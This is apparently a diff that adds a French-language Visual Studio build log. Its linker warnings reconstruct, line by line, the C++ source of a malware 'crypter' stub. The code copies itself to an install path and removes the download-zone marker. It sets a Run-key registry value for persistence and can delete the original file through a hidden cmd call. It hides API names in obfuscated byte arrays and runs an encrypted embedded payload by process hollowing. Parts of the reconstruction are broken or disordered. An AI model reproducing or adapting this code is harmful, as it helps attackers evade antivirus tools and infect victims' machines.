+     1>crypter.cpp : warning LNK4037: '_CopyFile(processPath, installPath, FALSE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_char zoneId[MAX_PATH + 1]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_strcpy(zoneId, installPath)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_strcat(zoneId, ":stm")' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DeleteFile(zoneId)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPVOID key' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE parentKeyName[] = { 113, 170, 104, 1, 233, 72, 213, 106, 111, 253, 182, 182, 37, 138, 93, 120, 100, 237, 71, 193, 125, 187, 21, 1, 62, 0, 155, 106, 157, 113, 140, 190, 236, 161, 155, 225, 229, 224, 45, 107, 198, 26, 122, 7, 216, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(parentKeyName, 45)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE advapi32dllStr[] = { 99, 161, 120, 20, 238, 64, 148, 61, 29, 212, 179, 185, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(advapi32dllStr, 12)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pLoadLibraryA((char *)advapi32dllStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE regOpenKeyExAstr[] = { 112, 160, 105, 58, 238, 76, 201, 68, 86, 201, 154, 173, 22, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(regOpenKeyExAstr, 13)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef LONG(WINAPI *T_RegOpenKeyExA) (HKEY hKey,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPCTSTR lpSubKey,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD ulOptions,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_REGSAM samDesired,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PHKEY phkResult)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_RegOpenKeyExA pRegOpenKeyExA = (T_RegOpenKeyExA)pGetProcAddress(pGetModuleHandleA((char *)advapi32dllStr), (char *)regOpenKeyExAstr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pRegOpenKeyExA(HKEY_CURRENT_USER, (char *)parentKeyName, 0, KEY_ALL_ACCESS, (PHKEY)&key)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE regSetValueExAstr[] = { 112, 160, 105, 38, 251, 93, 241, 110, 95, 197, 186, 144, 47, 164, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(regSetValueExAstr, 14)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef LONG(WINAPI *T_RegSetValueExA) (HKEY hKey,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPCTSTR lpValueName,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD Reserved,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD dwType,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_const BYTE *lpData,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD cbData)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_RegSetValueExA pRegSetValueExA = (T_RegSetValueExA)pGetProcAddress(pGetModuleHandleA((char *)advapi32dllStr), (char *)regSetValueExAstr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pRegSetValueExA((HKEY)key, keyName, 0, REG_SZ, (BYTE *)installPath, strlen(installPath) + 1)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_STARTUPINFO si = { 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PROCESS_INFORMATION pi' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_si.cb = sizeof(si)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pCreateProcess(installPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (melt)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE prefixArg[] = { 13, 166, 46, 5, 247, 71, 192, 47, 2, 158, 238, 251, 102, 203, 31, 55, 47, 247, 59, 167, 52, 248, 6, 78, 124, 67, 247, 9, 206, 35, 154, 190, 238, 245, 239, 161, 228, 177, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(prefixArg, 38)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_char arg[MAX_PATH + 1]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_sprintf(arg, (char *)prefixArg, processPath)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE shell32dllStr[] = { 81, 173, 107, 25, 242, 26, 149, 33, 87, 220, 179, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE shellExecuteAstr[] = { 113, 173, 107, 25, 242, 108, 223, 106, 80, 197, 171, 176, 22, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(shellExecuteAstr, 13)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(shell32dllStr, 11)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pLoadLibraryA((char *)shell32dllStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef HINSTANCE(*T_ShellExecute) (HWND hwnd,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPCTSTR lpOperation,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPCTSTR lpFile,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPCTSTR lpParameters,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPCTSTR lpDirectory,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_INT nShowCmd)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_ShellExecute pShellExecuteA = (T_ShellExecute)pGetProcAddress(pGetModuleHandleA((char *)shell32dllStr), (char *)shellExecuteAstr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE cmdStr[] = { 65, 168, 106, 91, 251, 81, 194, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(cmdStr, 7)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE openStr[] = { 77, 181, 107, 27, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(openStr, 4)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pShellExecuteA(NULL, (char *)openStr, (char *)cmdStr, arg, NULL, SW_HIDE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_return TRUE' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_int payloadSize' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_payloadOffset -= sizeof(int)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pMemcpy(&payloadSize, payloadOffset, sizeof(int))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_payloadOffset -= payloadSize' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_payload = (BYTE *)malloc(payloadSize)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pMemcpy(payload, payloadOffset, payloadSize)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(payload, payloadSize)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (dotNet)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE getWindowsDirectoryAstr[] = { 101, 160, 122, 34, 247, 71, 195, 96, 68, 195, 155, 188, 37, 128, 77, 99, 109, 235, 98, 215, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(getWindowsDirectoryAstr, 20)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef UINT(WINAPI *T_GetWindowsDirectoryA) (LPTSTR lpBuffer, UINT uSize)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_GetWindowsDirectoryA pGetWindowsDirectoryA = (T_GetWindowsDirectoryA)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getWindowsDirectoryAstr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_char vbcPath[MAX_PATH + 1]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pGetWindowsDirectoryA(vbcPath, MAX_PATH)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE pathPart[] = { 126, 136, 103, 22, 236, 70, 212, 96, 85, 196, 241, 155, 18, 177, 114, 81, 112, 248, 118, 243, 99, 186, 3, 5, 21, 5, 245, 7, 216, 45, 203, 235, 181, 231, 250, 216, 218, 192, 6, 113, 193, 42, 76, 92, 211, 143, 54, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(pathPart, 47)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_strcat(vbcPath, (char *)pathPart)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_RunPe(vbcPath, payload)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_else' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_RunPe(processPath, payload)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_else' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_fclose(fp)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_return TRUE' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_void RunPe(LPSTR szFilePath, LPVOID pFile)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE ntdllStr[] = { 108, 177, 106, 25, 242, 7, 195, 99, 95, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf((BYTE *)ntdllStr, 9)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE ntUnmapViewOfSectionStr[] = { 108, 177, 91, 27, 243, 72, 215, 89, 90, 213, 168, 154, 49, 182, 75, 116, 118, 240, 116, 248, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(ntUnmapViewOfSectionStr, 20)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef LONG(WINAPI *NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PIMAGE_DOS_HEADER IDH' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PIMAGE_NT_HEADERS INH' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PIMAGE_SECTION_HEADER ISH' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PROCESS_INFORMATION PI = { 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_STARTUPINFOA SI = { 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PCONTEXT CTX' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PDWORD dwImageBase' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_NtUnmapViewOfSection xNtUnmapViewOfSection' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPVOID pImageBase' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_int Count' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE virtualAllocStr[] = { 116, 172, 124, 1, 235, 72, 203, 78, 95, 220, 176, 182, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(virtualAllocStr, 12)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef LPVOID(WINAPI *T_VirtualAlloc) (LPVOID lpAddress,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_SIZE_T dwSize,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD  flAllocationType,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD  flProtect)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_VirtualAlloc pVirtualAlloc = (T_VirtualAlloc)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)virtualAllocStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE readProcessMemoryStr[] = { 112, 160, 111, 17, 206, 91, 200, 108, 86, 195, 172, 152, 50, 136, 65, 101, 123, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(readProcessMemoryStr, 17)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_ReadProcessMemory) (HANDLE  hProcess,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPCVOID lpBaseAddress,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPVOID  lpBuffer,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_SIZE_T  nSize,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_SIZE_T  *lpNumberOfBytesRead)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_ReadProcessMemory pReadProcessMemory = (T_ReadProcessMemory)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)readProcessMemoryStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE getThreadContextStr[] = { 101, 160, 122, 33, 246, 91, 194, 110, 87, 243, 176, 187, 35, 128, 86, 99, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(getThreadContextStr, 16)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_GetThreadContext) (HANDLE hThread, LPCONTEXT lpContext)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_GetThreadContext pGetThreadContext = (T_GetThreadContext)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getThreadContextStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE virtualAllocExStr[] = { 116, 172, 124, 1, 235, 72, 203, 78, 95, 220, 176, 182, 18, 157, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(virtualAllocExStr, 14)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef LPVOID(WINAPI *T_VirtualAllocEx) (HANDLE hProcess,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPVOID lpAddress,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_SIZE_T dwSize,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD  flAllocationType,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD  flProtect)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_VirtualAllocEx pVirtualAllocEx = (T_VirtualAllocEx)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)virtualAllocExStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE virtualFreeStr[] = { 116, 172, 124, 1, 235, 72, 203, 73, 65, 213, 186, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(virtualFreeStr, 11)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_VirtualFree) (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_VirtualFree pVirtualFree = (T_VirtualFree)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)virtualFreeStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE setThreadContextStr[] = { 113, 160, 122, 33, 246, 91, 194, 110, 87, 243, 176, 187, 35, 128, 86, 99, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(setThreadContextStr, 16)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_SetThreadContext) (HANDLE  hThread, CONTEXT *lpContext)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_SetThreadContext pSetThreadContext = (T_SetThreadContext)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)setThreadContextStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE resumeThreadStr[] = { 112, 160, 125, 0, 243, 76, 243, 103, 65, 213, 190, 177, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(resumeThreadStr, 12)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef DWORD(WINAPI *T_ResumeThread) (HANDLE hThread)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_ResumeThread pResumeThread = (T_ResumeThread)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)resumeThreadStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE writeProcessMemoryStr[] = { 117, 183, 103, 1, 251, 121, 213, 96, 80, 213, 172, 166, 26, 128, 67, 120, 112, 224, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(writeProcessMemoryStr, 18)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_WriteProcessMemory) (HANDLE  hProcess,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPVOID  lpBaseAddress,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPCVOID lpBuffer,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_SIZE_T  nSize,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_SIZE_T  *lpNumberOfBytesWritten)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_WriteProcessMemory pWriteProcessMemory = (T_WriteProcessMemory)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)writeProcessMemoryStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_IDH = PIMAGE_DOS_HEADER(pFile)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (IDH->e_magic == IMAGE_DOS_SIGNATURE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (INH->Signature == IMAGE_NT_SIGNATURE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (pCreateProcess(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED + CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &SI, &PI))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_CTX->ContextFlags = CONTEXT_FULL' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (pGetThreadContext(PI.hThread, LPCONTEXT(CTX)))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_xNtUnmapViewOfSection = NtUnmapViewOfSection(pGetProcAddress(pGetModuleHandleA((char *)ntdllStr), (char *)ntUnmapViewOfSectionStr))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pImageBase = pVirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (pImageBase)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pWriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_for (Count = 0' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pWriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pSetThreadContext(PI.hThread, LPCONTEXT(CTX))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_//void AntiMemScan(PROCESS_INFORMATION PI, PIMAGE_NT_HEADERS INH, LPVOID pImageBase)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_//AntiMemScan(PI, INH, pImageBase)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pResumeThread(PI.hThread)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Sleep(5000)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_else' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_TerminateProcess(PI.hProcess, 0)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_STARTUPINFO si = { 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PROCESS_INFORMATION pi = { 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_si.cb = sizeof(si)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pCreateProcess(processPath, "-", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_ExitProcess(0)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pVirtualFree(pFile, 0, MEM_RELEASE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_void Persistance(PROCESS_INFORMATION PI)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (persist)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (dotNet)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE getWindowsDirectoryAstr[] = { 101, 160, 122, 34, 247, 71, 195, 96, 68, 195, 155, 188, 37, 128, 77, 99, 109, 235, 98, 215, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(getWindowsDirectoryAstr, 20)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef UINT(WINAPI *T_GetWindowsDirectoryA) (LPTSTR lpBuffer, UINT uSize)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_GetWindowsDirectoryA pGetWindowsDirectoryA = (T_GetWindowsDirectoryA)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getWindowsDirectoryAstr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_char vbcPath[MAX_PATH + 1]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pGetWindowsDirectoryA(vbcPath, MAX_PATH)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE pathPart[] = { 126, 136, 103, 22, 236, 70, 212, 96, 85, 196, 241, 155, 18, 177, 114, 81, 112, 248, 118, 243, 99, 186, 3, 5, 21, 5, 245, 7, 216, 45, 203, 235, 181, 231, 250, 216, 218, 192, 6, 113, 193, 42, 76, 92, 211, 143, 54, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(pathPart, 47)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_strcat(vbcPath, (char *)pathPart)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_RunPe(vbcPath, payload)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_else' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_RunPe(processPath, payload)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_else' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_ExitProcess(0)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}/*' n'existe pas ; sera ignoré
